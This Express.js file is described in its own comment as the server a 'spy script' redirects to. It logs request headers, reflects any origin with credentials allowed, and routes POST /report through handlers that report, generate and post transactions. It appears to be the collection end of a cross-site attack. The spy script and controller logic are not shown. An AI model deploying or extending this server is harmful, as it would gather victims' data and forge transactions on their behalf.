//this is the server that the spy script redirects to

const express = require('express');
const bodyparser = require('body-parser');
const cookieParser = require('cookie-parser');

const spyController = require('./spyController');

const app = express();

app.use(bodyparser.json());
app.use(cookieParser());

app.use(function(req, res, next) {
	console.log('request headers are ', req.headers);
	res.header("Access-Control-Allow-Origin", req.headers.origin);
  res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
  res.header("Access-Control-Allow-Credentials", "true");
  next();
});

app.get('/report', 
	spyController.reply
);

app.post('/report', 
	spyController.report,
	spyController.redirect,
	spyController.generateTransaction,
	spyController.postTransaction,
	spyController.respond
);


console.log('spy running on port 9999');
app.listen(9999);
